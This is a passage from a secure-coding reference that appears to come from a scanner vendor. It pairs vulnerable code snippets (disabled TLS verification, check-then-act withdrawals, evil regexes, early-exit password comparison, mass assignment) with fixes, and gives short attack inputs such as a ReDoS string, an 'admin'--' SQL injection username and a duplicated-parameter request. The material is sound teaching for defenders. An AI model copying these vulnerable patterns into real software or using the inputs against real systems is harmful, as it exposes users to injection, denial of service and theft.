client := &http.Client{
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,  // DANGEROUS
        },
    },
}
```

**template.HTML XSS**:
```go
// VULNERABLE - Marks string as safe HTML
template.HTML(userInput)
```

---

## Advanced & Rare Vulnerabilities

### Race Conditions / TOCTOU (CWE-367)

**Risk Level**: Medium-High | **CVSS**: 7.0

**What it is**: Exploiting time gap between check and use.

**Common Exploitation Scenarios**:
- Discount codes applied multiple times
- Balance checks bypassed
- Rate limits bypassed
- 2FA codes reused

**Vulnerable Code**:
```javascript
// Check-then-act race condition
async function withdraw(userId, amount) {
  const balance = await getBalance(userId);
  if (balance >= amount) {
    // Race window here
    await updateBalance(userId, balance - amount);
  }
}
```

**Secure Code**:
```javascript
// Use atomic operations
async function withdraw(userId, amount) {
  const result = await db.query(
    'UPDATE accounts SET balance = balance - $1 WHERE user_id = $2 AND balance >= $1 RETURNING balance',
    [amount, userId]
  );
  if (result.rowCount === 0) {
    throw new Error('Insufficient funds');
  }
}

// Use database locks
await db.query('SELECT * FROM accounts WHERE id = $1 FOR UPDATE', [userId]);
```

---

### ReDoS - Regular Expression DoS (CWE-1333)

**Risk Level**: Medium | **CVSS**: 7.5

**What it is**: Crafted input causing exponential regex backtracking.

**Vulnerable Patterns**:
```javascript
// Evil regex patterns
/^(a+)+$/            // Nested quantifiers
/^([a-zA-Z0-9]+)*$/  // Alternation with overlap
/^(a|a)+$/           // Overlapping alternatives
/(.*a){x}/           // Greedy quantifier with repetition
```

**Attack**:
```javascript
// Pattern: ^(a+)+$
// Input: "aaaaaaaaaaaaaaaaaaaaaaaa!"
// Causes exponential backtracking
```

**Prevention**:
```javascript
// Use linear-time regex engine (RE2)
import RE2 from 're2';
const re = new RE2('^[a-z]+$');

// Set timeout on regex operations
// Avoid nested quantifiers
// Use atomic groups where supported
```

---

### Integer Overflow/Underflow (CWE-190)

**Risk Level**: High | **CVSS**: 8.1

**What it is**: Arithmetic operations exceeding integer bounds.

**Vulnerable Code**:
```c
// C - Buffer size calculation
int size = width * height;  // Can overflow
char *buffer = malloc(size);

// JavaScript - Less common but possible
const MAX_INT = 9007199254740991;
MAX_INT + 1 === MAX_INT + 2  // true (precision loss)
```

**Notable CVEs**:
- CVE-2023-5869 (PostgreSQL)
- CVE-2022-36934 (WhatsApp RCE)
- CVE-2023-2136 (Chrome sandbox escape)

---

### DNS Rebinding

**Risk Level**: High | **CVSS**: 8.1

**What it is**: Bypassing same-origin policy via DNS manipulation.

**Attack Flow**:
1. Victim visits attacker.com
2. DNS initially resolves to attacker's server
3. After TTL expires, DNS resolves to 127.0.0.1
4. JavaScript now has same-origin access to localhost services

**Prevention**:
```javascript
// Server-side: Validate Host header
app.use((req, res, next) => {
  const allowedHosts = ['example.com', 'www.example.com'];
  if (!allowedHosts.includes(req.headers.host)) {
    return res.status(400).send('Invalid Host header');
  }
  next();
});

// Require authentication on all internal services
// Use HTTPS with proper certificates
```

---

### Timing Attacks (Side Channel)

**Risk Level**: Medium | **CVSS**: 5.9

**What it is**: Extracting information by measuring operation time.

**Vulnerable Code**:
```javascript
// Early-exit comparison
function checkPassword(input, stored) {
  if (input.length !== stored.length) return false;
  for (let i = 0; i < input.length; i++) {
    if (input[i] !== stored[i]) return false;  // Timing leak
  }
  return true;
}
```

**Secure Code**:
```javascript
// Constant-time comparison
import crypto from 'crypto';

function secureCompare(a, b) {
  if (a.length !== b.length) {
    // Compare against itself to maintain constant time
    return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(a)) && false;
  }
  return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
}
```

---

### Second-Order SQL Injection

**Risk Level**: High | **CVSS**: 8.1

**What it is**: Injected payload stored and triggered later in different query.

**Attack Scenario**:
```
1. Register with username: admin'--
2. Username stored safely with escaping
3. Later, username used in another query without escaping
4. SQL injection triggered
```

**Prevention**:
- Use parameterized queries everywhere
- Treat stored data as untrusted
- Validate on output, not just input

---

### HTTP Parameter Pollution

**Risk Level**: Medium | **CVSS**: 5.3

**What it is**: Supplying multiple values for same parameter to bypass filters.

**Attack**:
```
GET /transfer?amount=100&amount=10000
# Different servers handle duplicates differently
# Apache: First value (100)
# PHP: Last value (10000)
# ASP.NET: Both (100,10000)
```

**Prevention**:
```javascript
// Explicitly handle array parameters
const amount = Array.isArray(req.query.amount)
  ? req.query.amount[0]
  : req.query.amount;
```

---

### Mass Assignment

**Risk Level**: High | **CVSS**: 8.1

**What it is**: Setting unintended model attributes through user input.

**Vulnerable Code**:
```ruby
# Rails - All params passed to create
@user = User.new(params[:user])
# Attacker: user[admin]=true
```

```javascript
// Node.js - Spread operator with user input
const user = new User({ ...req.body });
```

**Secure Code**:
```ruby
# Rails - Strong parameters
@user = User.new(user_params)

private
def user_params
  params.require(:user).permit(:name, :email)
end
```

```javascript
// Whitelist allowed fields
const { name, email } = req.body;
const user = new User({ name, email });
```

---

## Detection Methods & Tools

### SAST Tools (Static Analysis)

| Tool | Languages | Type |
|------|-----------|------|
| Semgrep | Multi-language | Pattern matching |
| ESLint Security | JavaScript | Linter plugin |
| Bandit | Python | Security linter |
| Brakeman | Ruby/Rails | Security scanner |
| SpotBugs | Java | Bug finder |
| gosec | Go | Security scanner |
| PHPStan | PHP | Static analyzer |

### SCA Tools (Software Composition Analysis)

| Tool | Function |
|------|----------|
| Trivy | Container & dependency scanning |
| Snyk | Dependency vulnerabilities |
| npm audit | npm package auditing |
| pip-audit | Python package auditing |
| Dependabot | Automated updates |

### Secret Detection

| Tool | Function |
|------|----------|
| Gitleaks | Git secret scanning |
| TruffleHog | High entropy secret detection |
| detect-secrets | Pre-commit secret detection |

---

## Quick Reference Tables

### Severity Mapping

| CVSS Score | Severity | Priority |
|------------|----------|----------|
| 9.0 - 10.0 | Critical | Immediate |
| 7.0 - 8.9 | High | 24-48 hours |
| 4.0 - 6.9 | Medium | 1-2 weeks |
| 0.1 - 3.9 | Low | Next release |

### OWASP Top 10 to CWE Mapping

| OWASP | Primary CWEs |
|-------|--------------|
| A01 Broken Access Control | CWE-22, CWE-639, CWE-862 |
| A02 Cryptographic Failures | CWE-327, CWE-328, CWE-798 |
| A03 Injection | CWE-77, CWE-78, CWE-79, CWE-89 |
| A04 Insecure Design | CWE-209, CWE-256, CWE-501 |
| A05 Security Misconfiguration | CWE-16, CWE-611, CWE-1004 |
| A06 Vulnerable Components | CWE-1035, CWE-1104 |
| A07 Auth Failures | CWE-287, CWE-384, CWE-613 |
| A08 Data Integrity Failures | CWE-502, CWE-829 |
| A09 Logging Failures | CWE-532, CWE-778 |
| A10 SSRF | CWE-918 |

---

## Resources

### Official Documentation
- [OWASP Top 10](https://owasp.org/Top10/)
- [CWE Database](https://cwe.mitre.org/)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [OWASP API Security Top 10](https://owasp.org/API-Security/)

### Testing Resources
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Vulnerable Applications for Testing
- [DVWA](https://github.com/digininja/DVWA)
- [OWASP Juice Shop](https://github.com/juice-shop/juice-shop)
- [OWASP crAPI](https://github.com/OWASP/crAPI)
- [WebGoat](https://github.com/WebGoat/WebGoat)

---

*This document is maintained by the Vibeship Scanner team. Continuously updated based on security research and scanner testing against vulnerable applications.*

*Last comprehensive update: 2025-12-02*
